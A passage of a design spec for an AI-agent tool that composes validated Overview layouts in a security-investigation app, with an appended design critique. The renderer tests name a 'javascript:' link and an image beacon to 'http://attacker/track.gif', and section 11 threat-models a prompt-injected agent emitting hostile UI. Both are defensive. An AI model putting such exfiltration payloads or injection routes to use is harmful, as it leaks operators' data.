    {"error": …}.  `dropped` lists any blocks/props the validator removed —
    fix + resend if non-empty and the layout looks wrong.
    """
    s, err = _store()
    if err:
        return err
    result, verr = validate_layout_spec(layout_spec)   # from usecase.layout_spec
    if verr:
        return {"error": verr}
    import json
    cleaned = result["spec"]                            # [Resolved #8] wrapper shape
    dropped = result["dropped"]
    if not s.set_issue_layout(issue_id, json.dumps(cleaned)):
        return {"error": f"issue {issue_id!r} not found"}
    _emit_layout_event(issue_id, len(cleaned["blocks"]), len(dropped))  # [Resolved #12]
    return {"ok": True, "issue_id": issue_id,
            "blocks": len(cleaned["blocks"]), "dropped": dropped}
```

### 5.2 (Removed) `case_set_layout`

**Cut from v0.3.0 [Resolved #2].** No case tool ships this release. Tracked for v0.3.1.

### 5.3 `issue_clear_layout` (optional, same release)

Thin wrapper calling `set_issue_layout(issue_id, None)`. Lets the agent reset to static. The UI's "Reset to default layout" button (§7) calls the REST PATCH path (§6.1), so this tool is optional — include only if cheap. (Note: because the clear path is now a dedicated branch [Resolved #1], both the tool and the REST PATCH converge on `set_issue_layout(id, None)`.)

### 5.4 Registration & why catalog-side

Register in `bundles/spark/mcp/src/usecase/connector_loader.py`, in `_BUILTIN_LEGACY_TOOLS`, right after the existing diagram tools:

```python
("issue_set_layout", investigation_tools.issue_set_layout),
# ("issue_clear_layout", investigation_tools.issue_clear_layout),  # optional
```

(No `main.py` change needed — `main.py` only wires `set_investigation_store`; the tool list is consumed by `connector_loader`.)

**Why catalog-side, not credential-side** (the two-question test from root CLAUDE.md § Catalog boundary ≠ credential boundary):
1. *Does this tool read or write a SecretStore value?* **No.** It writes one TEXT column in `investigations.db`. No UI password, no provider creds, no instance secrets, no API keys, no KEK.
2. *Does it mutate catalog/investigation metadata?* **Yes** — `layout_spec` is investigation metadata, the same domain as `summary`/`scope`/`attack_chain_svg`, which the agent already writes via `issue_update` / `issue_set_attack_chain`.

So it's squarely on the safe (catalog) side, exactly where `issue_set_attack_chain` lives. Worst case if the agent composes a bad layout: the operator sees a weird-but-safe Overview tab and clicks "Reset to default." No secret can leak or be destroyed.

### 5.5 Observability event [Resolved #12]

`_emit_layout_event(issue_id, blocks, dropped)` emits `investigation.layout_composed` on the existing investigation event bus (the same surface that powers `/observability/events`), payload `{ issue_id, blocks, dropped }`. This makes layout composition visible — silent telemetry is rot (root § Documentation discipline rule 4). The observability page picks it up via the existing event-stream surface; no new page needed.

---

## 6. REST + proxy

**No new endpoints, no new proxy route.** The spec rides on the *existing* issue detail GET, exactly as `attack_chain_svg` / `relations_canvas_svg` already do. The reset is a dedicated branch on the existing PATCH.

### 6.1 MCP REST — `bundles/spark/mcp/src/api/investigation.py`

In `get_issue` (the `/api/v1/issues/{id}` GET), add one key to the response dict:

```python
return JSONResponse({
    **_issue_dict(issue),
    "events": [...],
    "case": ...,
    "attack_chain_svg": store.get_attack_chain(issue.id),
    "relations_canvas_svg": store.get_relations_canvas(issue.id),
    "layout_spec": store.get_issue_layout(issue.id),   # v0.3.0 — JSON string or null
})
```

**Reset path (fixed) [Resolved #1].** Add an explicit, sentinel-aware branch to `patch_issue` — do NOT route `layout_spec` through `update_issue`:

```python
# In patch_issue, BEFORE the generic update_issue(**body) call:
if "layout_spec" in body:
    raw = body.pop("layout_spec")
    if raw is None:
        # explicit clear — set_issue_layout writes NULL unconditionally
        store.set_issue_layout(issue_id, None)        # [Resolved #1]
    else:
        # a non-null layout via PATCH is validated like the tool path
        result, verr = validate_layout_spec(raw)
        if verr:
            return JSONResponse({"error": verr}, status_code=400)
        store.set_issue_layout(issue_id, json.dumps(result["spec"]))
    # fall through to apply any remaining (non-layout) keys via update_issue
```

The UI "Reset to default" button sends `PATCH {layout_spec: null}` → hits the `raw is None` branch → `set_issue_layout(id, None)` → column cleared. This is the verified-working escape hatch the whole safety argument leans on. **Test: PATCH null, then GET → `layout_spec` is null** (§10 step 3).

### 6.2 Next proxy — `mcp/agent/app/api/agent/issues/[id]/route.ts`

**Unchanged.** It already forwards GET/PATCH/DELETE for `/api/v1/issues/${id}` via `proxyToMcp`. The new `layout_spec` key rides through the GET response automatically; the PATCH `{layout_spec: null}` rides through automatically.

### 6.3 TypeScript type — `mcp/agent/lib/api/investigation.ts`

Add to `IssueDetail`:

```typescript
export interface IssueDetail extends Issue {
  events: IssueEvent[];
  case: CaseRow | null;
  attack_chain_svg: string | null;
  relations_canvas_svg: string | null;
  /** v0.3.0 — agent-composed Overview layout (validated JSON string), null = use static fallback. */
  layout_spec: string | null;
}
```

Plus a `LayoutSpec` / `LayoutBlock` discriminated-union type + the client-side `parseLayoutSpec(raw: string | null): LayoutSpec | null` guard (mirrors the Python validator's closed enums, **including the 3-value `field` enum** and **the unknown-major → null degrade [Resolved #4]**) — defined in `lib/api/investigation.ts` so types + the tone whitelist stay co-located. **No `CaseDetail` change [Resolved #2].**

### 6.4 `parseLayoutSpec` contract (client guard)

`parseLayoutSpec`:
- returns `null` for `null`/empty/unparseable input;
- returns `null` if `version` is not a recognized major (v0.3.0 recognizes only `1`) — **this is the unknown-major → static-fallback path [Resolved #4]; it never throws**;
- otherwise re-runs the closed-enum checks (type ∈ 10, `field` ∈ 3, `tone`/`accent` ∈ whitelist, depth ≤ 1) and drops anything malformed, returning a `LayoutSpec` whose `blocks` contain only valid nodes (possibly empty → caller renders static).

---

## 7. The renderer

New component `mcp/agent/components/investigation/layout-renderer.tsx`, exporting `<LayoutRenderer>`. It maps a **validated** spec → the closed registry of *existing* `ui.tsx` primitives. `"use client"` (it needs the issue's `patch`, `issueIndicators`, and the diagram SVGs from the parent).

### 7.1 Contract

```tsx
<LayoutRenderer
  spec={parsedSpec}                 // LayoutSpec | null (null → render nothing; caller falls back)
  issue={issue}                     // for `field` value lookups (summary|scope|recommendations only)
  indicators={issueIndicators}      // for the `indicators` block (already fetched in the page)
  onPatchField={(field, value) => patch({ [field]: value })}  // wires EditableSection save
  diagrams={{ chain: issue.attack_chain_svg, relations: issue.relations_canvas_svg }}
/>
```

### 7.2 Mapping (closed switch — no dynamic dispatch)

A single `renderBlock(block)` switch over the closed `type` enum. **No registry-by-string-lookup that could resolve to an arbitrary component; no `eval`; no dynamic `import`** — a literal `switch` whose default returns `null` (unknown types degrade to nothing):

```tsx
function renderBlock(b: LayoutBlock, ctx): ReactNode {
  switch (b.type) {
    case "field":      // b.props.field is guaranteed ∈ {summary,scope,recommendations} by parse guard
      return <EditableSection icon={b.props.icon ?? defaultIcon(b.props.field)}
               label={b.props.label ?? defaultLabel(b.props.field)}
               value={ctx.issue[b.props.field] ?? ""}
               onSave={(v) => ctx.onPatchField(b.props.field, v)} />;
    case "text":
      return <GlassCard title={b.props.title} icon={b.props.icon}>
               <SafeMarkdown>{b.props.markdown}</SafeMarkdown></GlassCard>;
    case "kv_table":   return <KvTable {...b.props} />;        // Badge-based presentational helper
    case "badge_row":  return <BadgeRow {...b.props} />;       // maps to Badge[]
    case "stat_cards": return <div className="grid …">{b.props.cards.map(c => <StatCard {...c} value={String(c.value)} />)}</div>;
    case "list":       return <GlassList {...b.props} />;      // ol/ul of SafeMarkdown inline
    case "indicators": return <IndicatorsBlock indicators={ctx.indicators} {...b.props} />;
    case "diagram":    return <DiagramEmbed svg={ctx.diagrams[b.props.which]} {...b.props} />; // <img> data-URI, read-only
    case "columns":    return <div className={`grid grid-cols-${b.props.columns} gap-4`}>
                                {b.props.children.map(child => renderBlock(child, ctx))}</div>;
    case "section":    return <GlassCard title={b.props.title} icon={b.props.icon}>
                                <div className="space-y-4">{b.props.children.map(c => renderBlock(c, ctx))}</div></GlassCard>;
    default:           return null;   // unknown type → degrade silently
  }
}
```

The presentational helpers (`KvTable`, `BadgeRow`, `GlassList`, `GlassCard`, `IndicatorsBlock`, `DiagramEmbed`, `SafeMarkdown`) live in `layout-renderer.tsx`, are built **only** from existing primitives (`Badge`, `StatCard`, `IndicatorRow`, `MarkdownContent`, `glassStyle`, the diagram `<img>` data-URI pattern) and use **only** whitelisted Material-3 tokens. They are not registry-extensible at runtime; they are compiled into the bundle.

### 7.3 `SafeMarkdown` — the hardened markdown wrapper [Resolved #6]

`SafeMarkdown` wraps `MarkdownContent` (react-markdown ≥9) with the §2.5 hardening applied explicitly at the render layer (defense-in-depth on top of the validator):

```tsx
<MarkdownContent
  compact
  disallowedElements={['img']}      // kill image beacons
  unwrapDisallowed
  urlTransform={(url) =>            // https + relative/anchor only; drop javascript:/data:/http:/off-origin
    /^(https:|\/|#)/.test(url) ? url : '#'}
>{children}</MarkdownContent>
```

Renderer tests assert a `javascript:` link, a `data:` link, and an `![](http://attacker/track.gif)` image are all neutralized (§10 step 4).

### 7.4 How it degrades & coexists with tabs

- The renderer is invoked **only inside the existing `tab === "overview"` branch** of `mcp/agent/app/investigation/issues/[id]/page.tsx`. The other five tabs (Assessment / Indicators / Activity / Attack chain / Relations) are **completely unchanged** — the spec composes one tab body, not the whole page. Because the `field` enum is the 3 Overview fields only [Resolved #3], **no spec can ever place an Assessment field on Overview**, so tab identity is provably stable, not merely intended-to-be.
- In the page, after `const layout = kindLayout(issue.kind);`, add:
  ```tsx
  const spec = useMemo(() => parseLayoutSpec(issue.layout_spec), [issue.layout_spec]);
  // header overrides: spec wins per-field, else kindLayout
  const hdr = {
    icon:   spec?.icon   ?? layout.icon,
    accent: VALID_ACCENTS.has(spec?.accent ?? "") ? spec!.accent : layout.accent,
    focus:  spec?.focus  ?? layout.focus,
  };
  ```
  The header reads `hdr.*` instead of `layout.*`.
- Overview tab body becomes:
  ```tsx
  {tab === "overview" && (
    spec && spec.blocks.length > 0
      ? <LayoutRenderer spec={spec} issue={issue} indicators={issueIndicators}
          onPatchField={(f, v) => patch({ [f]: v })}
          diagrams={{ chain: issue.attack_chain_svg, relations: issue.relations_canvas_svg }} />
      : (/* the existing static three EditableSections — UNCHANGED fallback */)
  )}
  ```
- If `parseLayoutSpec` returns `null` (no spec, parse error, all blocks invalid, **or unrecognized major [Resolved #4]**), the static body renders exactly as today. **Zero UX change for existing issues; future-major specs degrade silently, never blank-page.**
- A small "Reset to default layout" affordance appears next to the tab bar **only when `spec` is present** — it calls `patch({ layout_spec: null })`, which hits the dedicated clear branch (§6.1) and actually clears the column [Resolved #1].

---

## 8. Skill wiring

A new skill teaches the agent **when and how** to compose a layout — the direct analogy to `svg_attack_chain` / `svg_relation_graph`. Same pattern: a `loadingMode: on-demand` workflow skill, loaded when the trigger fires, providing per-kind templates.

### 8.1 New skill — `bundles/spark/mcp/skills/workflows/compose_investigation_layout.md`

Front-matter with a **tight, one-sentence trigger description [Resolved #11]** (the registry/security/templates live in the body, §8.2 — they do NOT belong in the trigger):

```yaml
---
name: compose_investigation_layout
displayName: Compose a dynamic investigation layout
category: workflows
description: 'LOAD WHEN tailoring an Issue Overview layout to the investigation —
  after the issue fields + indicators exist. Provides the component-registry
  templates per incident kind for issue_set_layout.'
icon: dashboard_customize
source: platform
loadingMode: on-demand
locked: false
attack: []
---
```

### 8.2 Skill body

Sections mirroring `svg_attack_chain.md`'s structure:

- **When to use** — at resolve time (alongside drawing the attack chain), or when the operator asks to "lay out / foreground X for this issue." Explicitly: *only after* the investigation fields + indicators exist.
- **Hard rules** — the registry is closed (the 10 types, listed); you fill typed props; `tone`/`accent` come from the fixed Material-3 whitelist (the strings in §3.2); `icon` is a Material Symbol name (`[a-z0-9_]`, ≤32); **`field` is `summary|scope|recommendations` only — you cannot surface conclusions/next_steps** [Resolved #3]; markdown is sanitized (no HTML, no images, https links only) [Resolved #6]; no HTML/markup ever; caps (48 KB / 24 blocks / 48 nodes / one nesting level). If `issue_set_layout` returns a non-empty `dropped[]`, fix those blocks and resend.
- **The registry table** — the §2.2 table verbatim.
- **Per-kind templates** — copy-paste starting specs the agent adapts, one per incident kind:
  - *phishing* → the §2.3 example.
  - *malware* → kv_table (binary SHA-256 / C2 / affected host / isolation status) + `diagram{which:"chain"}` + indicators emphasizing `file_hash, ip, host`.
  - *lateral_movement* → kv_table (principal / logon type / source→dest host path) + indicators emphasizing `account, host, ip` + `diagram{which:"relations"}`.
  - *access_violation* → kv_table (principal / logon type / policy window / authorized?) + badge_row disposition + indicators emphasizing `account, ip, host`.
- **Procedure** — (1) read the investigation (`issue_get`) + indicators (`indicators_list`); (2) pick the template for `issue.kind`; (3) fill props from real findings; set `focus` to the one decision-driving question; (4) `issue_set_layout(...)`; (5) on `dropped[]`, correct + retry.
- **Cross-references** — driven by `xsoar_case_investigation` (§8.3); complements (does not replace) the static fallback.

> No case-level template in v0.3.0 [Resolved #2]; the case-level composition section is added in v0.3.1 when `case_set_layout` ships.

### 8.3 Driver-skill touch

In `bundles/spark/mcp/skills/workflows/xsoar_case_investigation.md`, add an optional step near the resolve/diagram step: *"(Optional) Compose a tailored Overview layout for the issue with the `compose_investigation_layout` skill + `issue_set_layout`, to foreground this investigation's decision-relevant facts."* Keep it optional so the agent isn't forced to compose a layout on every investigation (graceful: no spec → static fallback).

---

## 9. Graceful fallback + migration

- **The static three `EditableSection`s stay, untouched.** They are the default for: every existing issue (all `NULL` post-migration), every issue the agent never composes a layout for, any spec that fails to parse, **any stored spec whose major version a future renderer doesn't recognize [Resolved #4]**, and the header fields the spec doesn't override. **No deletion, no deprecation** — this is an additive overlay, not a v0.4.0-style canonical-state collapse.
- **Migration is additive only.** `ALTER TABLE issues ADD COLUMN layout_spec TEXT` runs on next boot via the existing `PRAGMA table_info` guard pattern. Existing rows get `NULL`. **No `cases` migration. No volume wipe, no destructive change → Scenario 1** (code-only, re-run existing installer, volumes preserved).
- **Per-block degrade**, not all-or-nothing: one bad block drops to nothing; the rest render. A fully-invalid spec → static fallback. The renderer never throws to a blank page.
- **Operator reset:** the "Reset to default layout" button (`PATCH {layout_spec: null}`) hits the dedicated clear branch [Resolved #1] and returns any issue to the static layout instantly — verified working, not a no-op. This is the documented recovery path (no migration tooling needed — matches the v0.4.0 retrospective's "operators get a clear path, not auto-migration" principle).
- **DTO leanness preserved [Resolved #5]:** `layout_spec` never enters the `Issue` dataclass (the explicit `_row_to_issue` mapper never reads it), so `list_issues` payloads are unchanged — verified by a regression test, not just asserted.

---

## 10. Build sequence

Ordered, each step independently testable. Spec-driven workflow: **open a GitHub Issue first** (`status:spec-approved` from operator before code), classify `scenario:code-only`, label `component:mcp component:agent area:investigation`. **File a separate v0.3.1 issue for Cases** [Resolved #2]. Each commit `Refs #N`; final `Closes #N`. Run the four-part pre-deploy gate before every push.

1. **Validator + store (Python, no UI yet).**
   - New `bundles/spark/mcp/src/usecase/layout_spec.py`: `validate_layout_spec()` returning `({"spec":…, "dropped":[…]}, None)` **[Resolved #8]** + the token/icon whitelists + the 3-value `OVERVIEW_FIELDS` enum **[Resolved #3]** + reconciled caps **[Resolved #7]** + `value` int/float/str stringify-then-cap **[Resolved #9]**.
   - `investigation_store.py`: `layout_spec` column migration (issues only) + `set_issue_layout` (unconditional write, None=NULL **[Resolved #1]**) + `get_issue_layout`.
   - **Tests** (`tests/test_layout_spec.py`): closed-enum acceptance; unknown-type drop; **`field` outside {summary,scope,recommendations} dropped [Resolved #3]**; prop-clamp; tone-whitelist; **`value:42` and `value:"x"*5000` both handled [Resolved #9]**; depth/node/block caps; **byte cap applied after clamping → soft-truncate not hard-reject [Resolved #7]**; hard-reject cases (bad version, non-dict, blocks-not-list); **exact return-tuple shape `({"spec":…,"dropped":[…]}, None)` [Resolved #8]**; **regression: `Issue` has no `layout_spec` attr and `list_issues()` output unchanged for a row with populated `layout_spec` [Resolved #5]**. **Test:** `PYTHONPATH=$PWD/src python3 -m pytest tests/test_layout_spec.py -x`.

2. **Agent tool + registration + observability.**
   - `investigation_tools.py`: `issue_set_layout` (+ optional `issue_clear_layout`), full docstring, `_emit_layout_event` → `investigation.layout_composed` **[Resolved #12]**.
   - `connector_loader.py`: add the entry to `_BUILTIN_LEGACY_TOOLS`.
   - **Test:** pytest tool-dispatch test — call with a valid spec, assert stored shape + empty `dropped`; **round-trip self-correction test: feed a partially-bad spec → assert non-empty `dropped[]` → feed the corrected spec → assert clean store + empty `dropped` [Resolved #12]**; assert `investigation.layout_composed` emitted with `{blocks, dropped}`; grep the catalog endpoint to confirm the tool registers.

3. **REST + types.**
   - `api/investigation.py`: add `layout_spec` to `get_issue` response; add the **dedicated sentinel-aware `layout_spec` branch to `patch_issue` [Resolved #1]** (null → `set_issue_layout(id, None)`; non-null → validate then store; both bypass `update_issue`'s None-skip).
   - `lib/api/investigation.ts`: `IssueDetail.layout_spec`, `LayoutSpec`/`LayoutBlock` types, `parseLayoutSpec()` (with **unknown-major → null degrade [Resolved #4]** + 3-value `field` enum), the mirrored tone whitelist.
   - **Test:** curl `GET /api/v1/issues/<id>` via bearer + IAP tunnel → confirm `layout_spec` key present (null for old issues); **`PATCH {layout_spec: null}` then GET → `layout_spec` is null [Resolved #1]**; `npx tsc --noEmit`.

4. **Renderer (with hardened markdown).**
   - New `components/investigation/layout-renderer.tsx`: `<LayoutRenderer>` + closed-switch `renderBlock` + presentational helpers + **`SafeMarkdown` with `disallowedElements={['img']}` + https-only `urlTransform` [Resolved #6]**.
   - `package.json`: ensure react-markdown pin `>=9 <10` **[Resolved #6]**.
   - **Test:** `npm run build`; local render of a hand-written valid spec; **renderer tests assert a `javascript:` link, a `data:` link, and an off-origin `![]()` image are neutralized [Resolved #6]**.

5. **Wire into the Issue detail page.**
   - `app/investigation/issues/[id]/page.tsx`: header `hdr` override, Overview-tab `<LayoutRenderer>` with static fallback, "Reset to default" affordance (calls `patch({layout_spec:null})`).
   - **No case-page change [Resolved #2].**
   - **Test:** `npm run build`; agent-side headless smoke — set a spec via the tool against a deployed test issue, GET the issue, load the page through the IAP tunnel, confirm the composed Overview renders, and **confirm "Reset" actually returns to static (GET shows null) [Resolved #1]**.

6. **Skill wiring.**
   - New `compose_investigation_layout.md` (**one-sentence trigger description [Resolved #11]**, templates-per-kind in body) + the optional step in `xsoar_case_investigation.md`.
   - **Test:** fire a one-shot agent job instructing the agent to compose a layout for a test phishing issue; poll the issue until `layout_spec` populates; confirm the rendered Overview; **confirm `investigation.layout_composed` shows on `/observability/events` [Resolved #12]**. This is the **end-to-end capability acceptance check** — agent reads → composes → stores → UI renders, no markup emitted.

7. **Docs (same release, per documentation discipline).**
   - `app/help/architecture/page.tsx`: one new anchor (`#dynamic-layouts`) under the Investigation module — the `layout_spec` column, validator, registry, tool, renderer, the closed-vocabulary security model (**stating accurately: tokens are closed-enum, icon is pattern-bounded [Resolved #10]; markdown is sanitized with images disallowed + https-only links [Resolved #6]**), the fallback contract, **and the explicit note that v0.3.0 is Issues-only with Cases tracked for v0.3.1 [Resolved #2]**.
   - `app/help/user/page.tsx`: one new anchor (`#dynamic-layouts`) tagged v0.3.0 — "Guardian tailors the Issue Overview to the investigation; reset to default any time."
   - `lib/journeys.ts`: one journey — "See how Guardian composes an Issue Overview layout / reset it."
   - `CHANGELOG.md` + `lib/release-notes.ts`: matching v0.3.0 entry (newest first in release-notes.ts), with the arc's capability-acceptance criteria. **CHANGELOG explicitly states Cases are deferred to v0.3.1.**
   - Sidebar: **no new page** → no sidebar change (the feature lives on the existing Issue detail page). Note explicitly in the issue so the v0.5.49 grep test is satisfied.

8. **Cumulative smoke matrix + tag approval.** Post the smoke matrix (chat + issue comment) with state-classification annotations; the capability acceptance is step-6's end-to-end pass on the deployed install. Then ask for explicit tag approval (the layout-composition arc is one release, so the tag fires at this completion).

---

## 11. Risks & open questions

**Prompt-injection / over-flexibility (the headline risk).** A compromised or manipulated agent could try to emit hostile UI. The closed registry + validation neutralize each vector:
- *Executable markup injection* → **impossible by construction.** The spec is JSON describing intent; no field is ever rendered as raw HTML. The formatting fields (`markdown`) go through react-markdown ≥9 (no `rehype-raw`, no `dangerouslySetInnerHTML`), **with images disallowed and links restricted to https/relative [Resolved #6]** — closing the image-beacon and `javascript:`/`data:`-link exfil vectors the original spec left unaddressed. Same guarantee as the SVG-as-`<img>` precedent, now verified on the link/image axis.
- *Component-type injection* → **impossible.** `type` is a closed 10-value enum; the renderer is a literal `switch` with `default: null`. No string→component lookup, no dynamic import.
- *Style/exfil via CSS* → **blocked.** `tone`/`accent` are a closed whitelist of semantic class strings; arbitrary CSS/hex is rejected at validate time. No `style=` string is ever taken from the spec. (Note: `icon` is *pattern-bounded* `^[a-z0-9_]{1,32}$`, not enumerated — safe charset, no injection, but accurately named as pattern-bounded not closed-enum [Resolved #10].)
- *Field-write injection / tab-identity drift* → **closed [Resolved #3].** `field` is a **3-value enum of Overview-only editable fields** (`summary | scope | recommendations`); the renderer wires `onSave` only to those. The agent can reorder/relabel the three Overview fields, never invent a write target and never surface an Assessment field on Overview. No spec input exists that can create a dual-edit surface.
- *Resource exhaustion* → **capped, and caps are mutually consistent [Resolved #7].** 24 blocks / 48 nodes / one nesting level / per-string caps sized under the 48 KB byte ceiling, which is applied last as a soft truncation (over-byte degrades, never hard-rejects a per-field-valid spec).
- *Data exfil via `indicators`/`diagram`* → **none.** Those blocks carry no data; they reference live store data the operator already sees.

Net: the agent's blast radius is "the operator sees a sub-optimally-arranged but safe Overview tab," recoverable in one click (and the one click now actually works [Resolved #1]). This is why the tool sits on the catalog side of the guardrail.

**Open questions for the operator (resolve at spec-approval):**
1. **Cases.** ~~Issues + cases together?~~ **Resolved by the critique: Issues-only for v0.3.0 [Resolved #2].** The case detail page has no Overview/tab/`EditableSection` host structure to overlay, and `update_case` accepts no text fields — so case layouts require *first building a tabbed case Overview*, a separate concept. *Cases ship as v0.3.1 with their own issue + design.* Confirm you're aligned that v0.3.0 is Issues-only.
2. **Should the agent auto-compose at resolve time, or only on demand?** The skill makes it optional (driven by `xsoar_case_investigation`). Auto-composing on every resolve is a stronger demo but spends an extra agent pass. *Recommendation: optional/on-demand for v0.3.0; observe usage before making it automatic.*
3. **Registry breadth.** v0.3.0 ships 10 types built from existing primitives. Future types (timeline-embed, a live XQL-result table, an enrichment-detail card) are deliberately deferred — each new type is a small additive PR. *Confirm the v0.3.0 set is sufficient for the phishing/malware/lateral-movement/access-violation kinds.*
4. **Spec versioning policy.** `version: 1` is gated at write now; the renderer degrades unrecognized majors to static fallback [Resolved #4]. When the registry grows incompatibly, do we bump to `version: 2` (renderer supports N and N−1) or migrate stored specs? *Recommendation: additive-only registry growth stays at v1; reserve v2 for a breaking prop change, with the renderer supporting N and N−1 and unknown-major-as-static as the universal safety net.*

---

### Files this release touches (all verified to exist)

| File | Change |
|---|---|
| `bundles/spark/mcp/src/usecase/layout_spec.py` | **NEW** — validator (wrapper-tuple return [#8], caps reconciled [#7], 3-value field enum [#3], value coercion [#9]) + whitelists + enums |
| `bundles/spark/mcp/src/usecase/investigation_store.py` | `layout_spec` migration (**issues only** [#2]) + `set_issue_layout` (unconditional/None-clear [#1]) + `get_issue_layout` |
| `bundles/spark/mcp/src/usecase/builtin_components/investigation_tools.py` | `issue_set_layout` (+ optional clear) + `investigation.layout_composed` event [#12] |
| `bundles/spark/mcp/src/usecase/connector_loader.py` | register `issue_set_layout` in `_BUILTIN_LEGACY_TOOLS` |
| `bundles/spark/mcp/src/api/investigation.py` | add `layout_spec` to `get_issue`; **dedicated sentinel-aware clear branch in `patch_issue` [#1]** |
| `bundles/spark/mcp/tests/test_layout_spec.py` | **NEW** — validator + tool-dispatch + round-trip self-correction [#12] + leanness regression [#5] + markdown-hardening assertions [#6] |
| `bundles/spark/mcp/skills/workflows/compose_investigation_layout.md` | **NEW** — one-sentence trigger [#11] + templates-per-kind body |
| `bundles/spark/mcp/skills/workflows/xsoar_case_investigation.md` | add the optional compose step (issue-level) |
| `mcp/agent/lib/api/investigation.ts` | `IssueDetail.layout_spec`, `LayoutSpec`/`LayoutBlock`, `parseLayoutSpec` (unknown-major→null [#4], 3-value field enum [#3]), tone whitelist |
| `mcp/agent/components/investigation/layout-renderer.tsx` | **NEW** — `<LayoutRenderer>` + closed switch + helpers + `SafeMarkdown` (images off, https-only links [#6]) |
| `mcp/agent/app/investigation/issues/[id]/page.tsx` | header override + Overview `<LayoutRenderer>` + static fallback + reset button |
| `mcp/agent/package.json` | react-markdown pin `>=9 <10` [#6] |
| `mcp/agent/app/help/architecture/page.tsx` | `#dynamic-layouts` anchor (spec; accurate security wording [#10][#6]; Issues-only note [#2]) |
| `mcp/agent/app/help/user/page.tsx` | `#dynamic-layouts` anchor (v0.3.0) |
| `mcp/agent/lib/journeys.ts` | one journey |
| `CHANGELOG.md` + `mcp/agent/lib/release-notes.ts` | v0.3.0 entry (Cases deferred to v0.3.1 noted) |

**Removed from the original file list [Resolved #2]:** `mcp/agent/app/investigation/cases/[id]/page.tsx` (no case-page change in v0.3.0), `case_set_layout`/`set_case_layout`/`get_case_layout`, and the `cases` table migration.

No proxy route changes needed (`app/api/agent/issues/[id]/route.ts` forwards GET/PATCH generically). No `main.py` change (tool list consumed by `connector_loader`). No installer change → **Scenario 1**.

---

**Verdict status: all 12 findings resolved.** Three High findings closed (reset path now a verified-working dedicated branch [#1]; case half descoped to v0.3.1 [#2]; `field` enum constrained to 3 Overview fields so tab identity is structurally guaranteed [#3]). Four Med findings closed (renderer unknown-major degrade [#4]; leanness claim corrected to credit the explicit mapper [#5]; markdown link/image hardening with explicit config + tests [#6]; caps reconciled with byte-cap-last soft-degrade [#7]; validator return-shape unified [#8]; value coercion specified [#9]). Three Low findings closed (icon accurately named pattern-bounded [#10]; skill description cut to one trigger sentence [#11]; observability event + round-trip test added [#12]). The spec is now internally consistent, executable, and contained to one concept.

---

## Appendix - adversarial critique (pre-revision)

Confirmed. The case page uses neither `EditableSection`, tabs, nor `kindLayout` — so the design's claim that the case page "gets the same `<LayoutRenderer>` treatment" and that "the case page already exists [so it's] the same code path" is materially false. The case detail page has no Overview-tab structure to host the renderer, no `field`-editable surface, and `update_case` only accepts three keys. This is a much larger lift than the design represents.

I have enough verified ground to deliver the critique.

---

1. **[High] The "Reset to default" path is broken by construction — `PATCH {layout_spec: null}` cannot clear the column.** `update_issue` (investigation_store.py:340) only applies a field when `fields[key] is not None`. A `null` value is silently skipped, so the column is *never* cleared. The design asserts in three places (§6.1, §7.3, §9) that this PATCH is the documented operator recovery path — it is the one-click escape hatch the entire safety argument leans on, and it is a no-op as specified. **Fix:** add an explicit `layout_spec` branch in `patch_issue` that calls `store.set_issue_layout(id, None)` when the key is present-and-null (sentinel-aware), *not* routed through the `is not None`-filtering `update_issue`. Same for cases. Unit-test the clear path specifically — "PATCH null then GET returns null."

2. **[High] The case half is drastically under-scoped — the case page is not the same code path.** The design repeatedly claims cases are "the same code path, the case page already exists" and recommends shipping both (§5.2, §11 Q1). Verified: `cases/[id]/page.tsx` has **no** `EditableSection`, **no** tab system, **no** `kindLayout`/Overview body to overlay, and `update_case` accepts only `title|description|status` (no text fields for a `field` block to wire). There is no Overview-tab host for `<LayoutRenderer>`, and the `field` registry block has nothing to bind to on a case. Delivering case layouts means building the tabbed Overview structure on the case page from scratch — a separate concept, not a free ride. **Fix:** descope to issues-only for v0.3.0 (the design's own "tighter contained release" alternative), and file cases as v0.3.1 with its own issue once the case-page Overview structure is designed. This also satisfies contained-release discipline better — one concept.

3. **[High] The `field` enum breaks tab identity — it lets the agent pull Assessment-tab fields onto the Overview tab.** The design claims (§1 non-goals, §7.3) that "tab identity stays stable" and the spec "composes the Overview body only." But the `field` enum includes `conclusions` and `next_steps`, which today live exclusively on the **Assessment** tab (issue page lines 287-288), while Overview holds only `summary|scope|recommendations` (lines 279-281). An agent composing an Overview layout with a `field:conclusions` block now renders the same `EditableSection` on *two* tabs simultaneously — two independent edit surfaces writing the same column, with no coordination. That is exactly the tab-identity drift and dual-write hazard the non-goals claim to forbid. **Fix:** restrict the `field` enum for the Overview-body spec to the three Overview fields (`summary|scope|recommendations`), OR explicitly accept cross-tab placement and document the dual-edit behavior — but you cannot claim "tab identity stays stable" while shipping the 5-field enum.

4. **[Med] `version` major-rejection is forward-incompatible with the design's own versioning policy.** §3.1 rule 1 hard-rejects any `version != 1`. But §11 Q4's recommended policy is "renderer supports N and N−1." A spec stored as `version:1` today, read by a future `version:2` renderer, is fine — but the *validator* rejecting `version:2` on write means a future agent emitting v2 against a not-yet-upgraded MCP gets a hard reject with no graceful path. More concretely: hard-rejecting unknown majors at *write* time is correct, but the *renderer* (§7) must tolerate a stored spec whose major it doesn't recognize by falling through to static — the design says the renderer "rejects unknown majors" (§2.1) without specifying it degrades to static rather than throwing. **Fix:** state explicitly that the renderer treats unknown-major as `parseLayoutSpec → null → static fallback`, never an exception.

5. **[Med] Storage size accounting is internally inconsistent and the DTO-leanness claim needs verifying against the SELECT.** The validator caps the spec at 48 KB (§3.1 rule 2), but `set_issue_layout` also touches `updated_at` (§4.2) — fine. The real gap: §4.2 claims `list_issues`/`list_cases` payloads stay "byte-for-byte unchanged" because the DTO doesn't gain the field. That holds **only if** `list_issues`' SELECT enumerates columns explicitly rather than `SELECT *`. If any list query is `SELECT *`, the new TEXT column rides along into the list payload and the leanness claim is false. **Fix:** before claiming leanness, grep the list queries for `SELECT *` over `issues`/`cases`; if present, either enumerate columns or accept the payload change in the design. (This is the kind of hardcoded/implicit-shape drift the v0.15.5 retrospective warns about.)

